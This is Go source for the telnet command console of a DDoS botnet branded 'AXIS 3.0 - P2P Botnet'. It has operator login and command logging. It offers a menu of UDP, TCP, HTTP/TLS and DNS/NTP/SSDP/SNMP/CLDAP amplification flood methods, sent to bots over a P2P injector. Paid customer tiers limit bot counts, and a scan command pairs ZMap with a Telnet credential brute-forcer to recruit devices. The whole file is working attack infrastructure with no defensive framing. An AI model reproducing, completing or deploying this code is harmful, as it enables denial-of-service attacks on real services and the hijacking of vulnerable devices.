package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;34m   ╔═╗═╗ ╦╦═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m   ╠═╣╔╩╦╝║╚═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;94m   ╩ ╩ ╚═╩╚═╝\r\n"))
	this.conn.Write([]byte("\x1b[1;34m  AXIS 3.0 - P2P Botnet\r\n"))
	this.conn.Write([]byte("\x1b[1;36m  Username\x1b[1;34m: \x1b[0m"))

	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;34m  Password\x1b[1;34m: \x1b[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\n\x1b[1;31mInvalid Credentials.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err == nil {
			log.SetOutput(loginLogsOutput)
			log.Printf("| login | user:%s | ip:%s", username, this.conn.RemoteAddr())
			loginLogsOutput.Close()
		}
	}

	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╦╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[1;36m           AXIS 3.0 P2P Network\r\n"))

	go func() {
		for {
			time.Sleep(time.Second)
			title := fmt.Sprintf("\033]0; AXIS 3.0 | User: %s\007", username)
			if userInfo.admin == 1 {
				title = fmt.Sprintf("\033]0; AXIS 3.0 | Admins:%d Users:%d | %s\007",
					database.totalAdmins(), database.totalUsers(), username)
			}
			if _, err := this.conn.Write([]byte(title)); err != nil {
				this.conn.Close()
				break
			}
		}
	}()

	for {
		var botCount int
		this.conn.Write([]byte("\x1b[1;32mAXIS\x1b[35m~# "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		if cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m           AXIS 3.0 P2P Network\r\n"))
			continue
		}

		if cmd == "HELP" || cmd == "help" || cmd == "?" || cmd == "METHODS" || cmd == "methods" {
			this.showMethods()
			continue
		}

		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
			this.showAdminHelp()
			continue
		}

		if cmd == "PORTS" || cmd == "ports" {
			this.showPorts()
			continue
		}

		if cmd == "INFO" || cmd == "info" {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m  User: \x1b[1;36m%s\x1b[0m\r\n", username)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m  Tier: \x1b[1;36m%s\x1b[0m\r\n", userInfo.tier)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m  Max Bots: \x1b[1;36m%d\x1b[0m\r\n", userInfo.maxBots)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m  Online Bots: \x1b[1;36m%d\x1b[0m\r\n", clientList.ClientCount())))
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err == nil {
				log.SetOutput(output)
				log.Printf("| user:%s | cmd:%s | ip:%s", username, cmd, this.conn.RemoteAddr())
				output.Close()
			}
		}

		// Handle bot count prefix
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34mFailed to parse botcount\x1b[0m\r\n")))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte("\x1b[1;34mBot count exceeds limit\x1b[0m\r\n"))
				continue
			}
			if len(countSplit) > 1 {
				cmd = countSplit[1]
			} else {
				continue
			}
		} else {
			botCount = userInfo.maxBots
		}

		// Handle bot category prefix
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			if len(cataSplit) > 1 {
				cmd = cataSplit[1]
			} else {
				continue
			}
		}

		// Parse and send attack
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
			continue
		}

		buf, err := atk.Build()
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
			continue
		}

		if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
			continue
		}

		if database.ContainsWhitelistedTargets(atk) {
			this.conn.Write([]byte("\x1b[1;34mTarget is whitelisted!\x1b[0m\r\n"))
			continue
		}

		// Send via P2P
		p2pSeeds := "127.0.0.1:49152"
		proxies := []string{}
		injector := NewP2PInjector(p2pSeeds, proxies)
		injector.UpdateBotCount(clientList.ClientCount())

		if injector.ShouldSeed() {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched! (seeding - %d bots)\x1b[0m\r\n", injector.BotCount())))
		} else {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched! (no seeding - %d bots)\x1b[0m\r\n", injector.BotCount())))
		}

		injector.SendAttack(buf)

		// Admin commands
		if userInfo.admin == 1 {
			// Scanner commands
			if strings.HasPrefix(cmd, "scan ") {
				this.handleScanCommand(cmd)
				continue
			}
			if cmd == "scan-status" {
				this.conn.Write([]byte("\x1b[1;36mScanners: Telnet + ZMap integrated\x1b[0m\r\n"))
				this.conn.Write([]byte("\x1b[1;36mUsage: scan <startIP> <endIP> [port]\x1b[0m\r\n"))
				continue
			}

			if cmd == "adduser" {
				this.handleAddUser(false)
				continue
			}
			if cmd == "addadmin" {
				this.handleAddUser(true)
				continue
			}
			if cmd == "deluser" {
				this.handleRemoveUser()
				continue
			}
			if cmd == "upgradeuser" {
				this.handleUpgradeUser()
				continue
			}
			if cmd == "listusers" {
				this.handleListUsers()
				continue
			}
			if cmd == "addbasic" {
				this.handleQuickAddUser(TierBasic)
				continue
			}
			if cmd == "addpremium" {
				this.handleQuickAddUser(TierPremium)
				continue
			}
			if cmd == "addvip" {
				this.handleQuickAddUser(TierVIP)
				continue
			}
		}

		// Network tools
		this.handleNetworkTools(cmd)
	}
}

func (this *Admin) showMethods() {
	this.conn.Write([]byte("\x1b[1;36m                          --> | ALL METHODS | <--                       \r\n"))
	this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 UDP:                                                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <target> <time> [len=1472] [dport=80]\x1b[1;34m                                 \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mvse <target> <time> [dport=27015]\x1b[1;34m                                         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfivem <target> <time> [dport=30120]\x1b[1;34m                                       \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdiscord <target> <time>\x1b[1;34m                                                   \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <target> <time> [dport=80]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 TCP:                                                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msyn <target> <time> [dport=80]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mack <target> <time> [dport=80]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfin <target> <time> [dport=80]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mrst <target> <time> [dport=80]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcpconn <target> <time> [dport=80]\x1b[1;34m                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mxmas <target> <time> [dport=80]\x1b[1;34m                                           \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mnull <target> <time> [dport=80]\x1b[1;34m                                           \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mwindow <target> <time> [dport=80]\x1b[1;34m                                         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 7 HTTP:                                                                       \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtls <url> <time>\x1b[1;34m                                                           \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp <url> <time>\x1b[1;34m                                                          \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mcf <url> <time>\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <url> <time>\x1b[1;34m                                                       \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAMPLIFICATION:                                                                      \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp <target> <time>\x1b[1;34m                                                     \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mntp-amp <target> <time>\x1b[1;34m                                                     \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mssdp-amp <target> <time>\x1b[1;34m                                                    \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msnmp-amp <target> <time>\x1b[1;34m                                                    \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mcldap-amp <target> <time>\x1b[1;34m                                                   \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mSPECIAL:                                                                            \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93micmp <target> <time>\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <target> <time>\x1b[1;34m                                                       \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreeth <target> <time>\x1b[1;34m                                                      \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mSCANNER: \x1b[1;93mscan <startIP> <endIP> [port]\x1b[1;34m - ZMap + Telnet brute              \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mscan-status\x1b[1;34m            - Show scanner status                                \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
}

func (this *Admin) showAdminHelp() {
	this.conn.Write([]byte("\x1b[1;36m                       --> | Admin HUB | <--                        \r\n"))
	this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mUSER MANAGEMENT:                                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36madduser     \x1b[1;94m- Create user with tier selection                         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddbasic    \x1b[1;94m- Quick add Basic (120s, 100 bots)                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddpremium  \x1b[1;94m- Quick add Premium (180s, 500 bots)                      \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddvip      \x1b[1;94m- Quick add VIP (600s, unlimited)                         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddadmin    \x1b[1;94m- Create Admin (unlimited)                                \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mupgradeuser \x1b[1;94m- Upgrade user tier                                        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mdeluser     \x1b[1;94m- Remove user                                             \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mlistusers   \x1b[1;94m- List all users                                          \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
}

func (this *Admin) showPorts() {
	this.conn.Write([]byte("\x1b[1;36m                          --> | Ports | <--                         \r\n"))
	this.conn.Write([]byte("\x1b[1;34m╔═════════════════════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m20=FTP(TCP)          \x1b[1;34m21=FTP-Control(TCP)   \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m22=SSH(TCP)          \x1b[1;34m23=TELNET(TCP)        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m53=DNS(UDP)          \x1b[1;34m80=HTTP(TCP)          \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m123=NTP(UDP)         \x1b[1;34m443=HTTPS(TCP)        \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m161=SNMP(UDP)        \x1b[1;34m389=LDAP(TCP)         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m3306=MySQL(TCP)      \x1b[1;34m3389=RDP(TCP)         \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m5060=SIP(UDP)        \x1b[1;34m8080=HTTP-Alt(TCP)    \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m27015=Steam(UDP)     \x1b[1;34m27017=MongoDB(TCP)    \x1b[1;34m║\r\n"))
	this.conn.Write([]byte("\x1b[1;34m╚═════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
}

func (this *Admin) handleNetworkTools(cmd string) {
	toolCmd := strings.ToLower(cmd)
	if strings.HasPrefix(toolCmd, "iplookup ") || strings.HasPrefix(toolCmd, "iplookup:") {
		this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
		ip := strings.TrimSpace(strings.TrimPrefix(cmd, "iplookup"))
		ip = strings.TrimPrefix(ip, ":")
		if ip == "" {
			return
		}
		url := "http://ip-api.com/line/" + ip
		resp, err := http.Get(url)
		if err != nil {
			this.conn.Write([]byte("\x1b[1;34mError occurred\x1b[0m\r\n"))
			return
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		result := strings.Replace(string(data), "\n", "\r\n", -1)
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mResults\x1b[1;34m:\r\n\x1b[1;36m%s\x1b[0m\r\n", result)))
	}
}

func (this *Admin) handleScanCommand(cmd string) {
	parts := strings.Fields(cmd)
	if len(parts) < 3 {
		this.conn.Write([]byte("\x1b[1;34mUsage: scan <startIP> <endIP> [port]\x1b[0m\r\n"))
		return
	}

	startIP := parts[1]
	endIP := parts[2]
	port := 23 // Default telnet port

	if len(parts) > 3 {
		fmt.Sscanf(parts[3], "%d", &port)
	}

	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mStarting scan: %s -> %s port %d\x1b[0m\r\n", startIP, endIP, port)))

	// Start ZMap scan for open ports
	zmapScanner = NewZMapScanner(100, port)
	go func() {
		zmapScanner.ScanIPRange(startIP, endIP)
		this.conn.Write([]byte("\x1b[1;36mZMap scan complete\x1b[0m\r\n"))
	}()

	// Start Telnet bruter on found IPs
	go func() {
		for result := range zmapScanner.GetResults() {
			telnetScanner.ScanTarget(result.IP, result.Port)
		}
	}()

	this.conn.Write([]byte("\x1b[1;36mScanning... Results will appear in scan-results.txt\x1b[0m\r\n"))
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	var buf [1]byte
	var line string

	for {
		n, err := this.conn.Read(buf[:])
		if err != nil || n != 1 {
			return line, err
		}
		if buf[0] == '\r' || buf[0] == '\n' {
			this.conn.Write([]byte("\r\n"))
			return line, nil
		}
		if buf[0] == 0x7f || buf[0] == '\x08' {
			if len(line) > 0 {
				line = line[:len(line)-1]
				this.conn.Write([]byte("\x1b[D \x1b[D"))
			}
			continue
		}
		if !masked {
			this.conn.Write(buf[:])
		}
		line += string(buf[:])
	}
}
